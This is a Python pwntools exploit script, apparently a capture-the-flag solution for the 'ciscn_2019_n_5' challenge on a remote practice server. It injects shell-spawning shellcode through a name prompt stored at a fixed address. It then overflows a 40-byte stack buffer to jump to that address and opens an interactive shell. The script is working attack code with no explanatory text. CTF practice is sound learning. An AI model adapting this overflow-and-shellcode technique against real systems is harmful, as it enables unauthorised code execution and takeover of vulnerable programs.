#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './ciscn_2019_n_5'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_host  = 'node3.buuoj.cn'
remote_port = 27176

DEBUG = False 
# DEBUG = True

if DEBUG:
	p = process(local_file)
	libc = ELF(local_libc)
else: 
	p = remote(remote_host,remote_port)
	libc = ELF(remote_libc)
elf = ELF(local_file)

context.log_level = 'debug'
context.arch = 'amd64'

# info
len = 40

# elf, libc
name = 0x601080

payload = 'A'*40
payload += p64(name)

shellcode = asm(shellcraft.sh())

p.recvuntil('tell me your name\n')
p.sendline(shellcode)

p.recvuntil('What do you want to say to me?\n')
# gdb.attach(p)
p.sendline(payload)

# log.info('')
# log.warning('--------------')

p.interactive()

